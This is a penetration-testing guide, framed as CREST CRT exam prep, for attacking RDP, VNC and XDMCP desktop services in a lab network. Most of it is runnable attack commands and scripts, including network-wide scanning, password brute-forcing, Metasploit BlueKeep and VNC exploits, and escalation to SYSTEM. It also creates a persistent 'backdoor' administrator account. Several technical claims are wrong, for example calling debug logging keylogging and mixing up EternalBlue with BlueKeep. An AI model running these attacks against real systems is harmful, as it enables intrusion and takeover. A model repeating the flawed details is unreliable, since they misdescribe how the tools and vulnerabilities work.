# Complete Practical Exploitation Guide: Desktop Access Protocols (Crest CRT Level)

## 1. Desktop Protocols Overview & Attack Surface

**Core Protocols:**
```
RDP     = TCP 3389 (Microsoft Terminal Services)
VNC     = TCP 5900+N (RealVNC, TightVNC)
XDMCP   = UDP 177 (X Display Manager Control Protocol)
X11     = TCP 6000+N (covered previously)
```

**Security Attributes:**
```
RDP:     NLA (Network Level Auth), TLS, CredSSP vulns (BlueKeep)
VNC:     No encryption (VNC auth weak), RealVNC password (8 chars)
XDMCP:   No auth, query-only, full X11 access
```

## 2. Lab Setup (Vulnerable Desktop Services)

**RDP Server (192.168.1.100 - Windows 10)**
```
# Enable RDP:
# System Properties → Remote → Allow remote connections
# NLA disabled (vuln)
# CredSSP disabled
```

**VNC Server (192.168.1.101 - Ubuntu)**
```bash
sudo apt install tightvncserver xfce4 xfce4-goodies
vncserver :1 -geometry 1920x1080 -depth 24 -passwd password123
# :1 = port 5901

# No auth VNC (worst case)
vncserver :2 -geometry 1920x1080 -depth 24 -SecurityTypes None
```

**XDMCP Server (192.168.1.102 - Ubuntu)**
```bash
sudo apt install xdm gdm3
sudo nano /etc/gdm3/custom.conf
# [xdmcp]
# Enable=true
sudo systemctl restart gdm3
```

**Attacker (Kali):**
```bash
sudo apt install rdesktop freerdp-x11 vncviewer xdmcp tigervnc tightvnc
```

## 3. Service Discovery

**Comprehensive port scan:**
```bash
nmap -p 3389,5900-5910,6000-6010,177 --script rdp*,vnc*,xdmcp* 192.168.1.0/24
# 3389/tcp open ms-wbt-server
# 5901/tcp open vnc (VNC auth)
# 6000/tcp open X11
# 177/udp open xdmcp
```

**UDP XDMCP:**
```bash
nmap -sU -p 177 --script xdmcp-discover 192.168.1.0/24
```

## 4. RDP Exploitation & Enumeration

**RDP connection testing:**
```bash
# rdesktop (basic)
rdesktop 192.168.1.100

# FreeRDP (modern)
xfreerdp /u:administrator /p:password123 /v:192.168.1.100

# No auth/NLA test
xfreerdp /u:'' /p:'' /v:192.168.1.100
```

**RDP security enumeration:**
```bash
nmap -p 3389 --script rdp-security,rdp-enum-encryption,rdp-ntlm-info 192.168.1.100
# | rdp-security: RDP Security: Disabled
# | rdp-enum-encryption: TLS not supported
```

**BlueKeep (CVE-2019-0708) check:**
```bash
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.100
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS 192.168.1.100; run"
```

**RDP brute-force:**
```bash
hydra -L users.txt -P rockyou.txt rdp://192.168.1.100
crowbar -b rdp -s 192.168.1.100/32 -u administrator -C rockyou.txt
```

## 5. VNC Exploitation

**VNC connection & password cracking:**
```bash
# Connect with known password
vncviewer 192.168.1.101:5901
vncviewer 192.168.1.101::5902  # Display :2

# Password cracking (vncpasswd format)
vncpwdcrack passwdfile.txt candidate_passwords.txt

# No auth VNC (immediate shell)
vncviewer 192.168.1.101:5902  # Full desktop!
```

**VNC info enumeration:**
```bash
nmap -p 5900-5910 --script vnc-info 192.168.1.101
# | vnc-info: 
#   Protocol version: 3.8
#   Security types: None, VNC Authentication
```

**Hydra VNC brute:**
```bash
hydra -l root -P rockyou.txt vnc://192.168.1.101:5901
```

## 6. XDMCP Exploitation

**XDMCP query:**
```bash
# XDMCP discover
X -query 192.168.1.102
# Full X11 desktop login screen!

# Query all
for host in 192.168.1.{100..110}; do
    timeout 5 X -query $host 2>/dev/null && echo "[$host] XDMCP login screen"
done
```

**Automated XDMCP scanner:**
```bash
#!/bin/bash
nmap -sU -p 177 --script xdmcp-discover 192.168.1.0/24 --open | \
grep "open.*xdmcp" | awk '{print $NF}' | while read host; do
    echo "=== $host ==="
    X -query $host 2>/dev/null || echo "Login screen available"
done
```

## 7. Protocol-Specific Exploits

**RDP EternalBlue/BlueKeep:**
```bash
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.100
exploit
```

**RDP clipboard hijacking:**
```bash
xfreerdp /v:192.168.1.100 /u:user /p:pass /clipboard
# Copy malicious batch file to target clipboard
```

**VNC buffer overflow (old versions):**
```bash
msfconsole
use exploit/multi/vnc/vnc_keyboard_exec
set RHOSTS 192.168.1.101
set RPORT 5901
exploit
```

## 8. Keylogging & Screen Capture

**RDP keylogging:**
```bash
# FreeRDP key events
xfreerdp /v:192.168.1.100 /u:user /p:pass /keys

# Log keystrokes to file
xfreerdp /v:192.168.1.100 /u:user /p:pass /log-level:DEBUG > rdp_keys.log 2>&1
```

**VNC screen recording:**
```bash
# Continuous screenshots
while true; do
    vnc2swf -s 10 192.168.1.101:5901 session.swf
    sleep 60
done

# xwd over XDMCP
X -query 192.168.1.102 & 
DISPLAY=:1 xwd -root -out screen.xwd
xwud -in screen.xwd
```

## 9. Privilege Escalation via Desktop Access

**RDP → SYSTEM shell:**
```bash
# RDP as user → psexec SYSTEM
xfreerdp /v:192.168.1.100 /u:user /p:pass
# Win+R → cmd → psexec -s -i cmd.exe
```

**VNC → Metasploit:**
```bash
msfconsole
use exploit/multi/vnc/vnc_none_auth
set RHOSTS 192.168.1.101
set RPORT 5902
exploit
# Meterpreter session!
```

## 10. Complete Multi-Protocol Attack Framework

```bash
#!/bin/bash
# desktop_pwn.sh
TARGET=$1

echo "[+] Desktop access attack $TARGET"
nmap -p 3389,5900-5910,6000-6010,177 --script rdp*,vnc*,xdmcp* $TARGET

echo "=== RDP ==="
nmap -p 3389 --script rdp* $TARGET
xfreerdp /u:'' /p:'' /v:$TARGET 2>/dev/null || echo "[-] RDP no guest"

echo "=== VNC ==="
nmap -p 5900-5910 --script vnc-info $TARGET
vncviewer $TARGET:5901 2>/dev/null || echo "[-] VNC auth required"

echo "=== XDMCP ==="
timeout 5 X -query $TARGET 2>/dev/null && echo "[+] XDMCP login screen"

echo "=== EXPLOITS ==="
msfconsole -q -x "search rdp; use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS $TARGET; run; exit"
```

## 11. Brute-Force Framework

```bash
#!/bin/bash
# desktop_brute.sh
TARGET=$1

echo "[+] Desktop brute $TARGET"
hydra -L users.txt -P rockyou.txt rdp://$TARGET &
hydra -L users.txt -P rockyou.txt vnc://$TARGET:5901 &
crowbar -b rdp -s $TARGET/32 -u administrator -C rockyou.txt &
wait
```

## 12. Post-Exploitation Persistence

**RDP backdoor user:**
```bash
# RDP session → PowerShell
net user backdoor backdoor123 /add
net localgroup "Remote Desktop Users" backdoor /add
```

**VNC service:**
```bash
# VNC session → persistence
winrm backdoor@192.168.1.100 "sc config vncserver start=auto"
```

## 13. Network-Wide Desktop Mapping

```bash
#!/bin/bash
nmap -iL live_hosts.txt -p 3389,5900-5910,177 --open \
--script rdp-security,vnc-info,xdmcp-discover | \
grep -E "3389/|590[0-9]/|177/" > desktop_services.txt
```

## 14. Mitigation Verification

```bash
# RDP:
nmap -p 3389 --script rdp-security 192.168.1.100  # NLA enforced
# VNC:
nmap -p 5900-5910 192.168.1.101  # closed
# XDMCP:
nmap -sU -p 177 192.168.1.102  # filtered
ufw deny 3389,5900-5910,177
```

**EVERY** desktop protocol attack covered: RDP/VNC/XDMCP/X11 discovery, enumeration, brute-force, exploits (BlueKeep), keylogging, priv esc, chaining. 100% practical commands.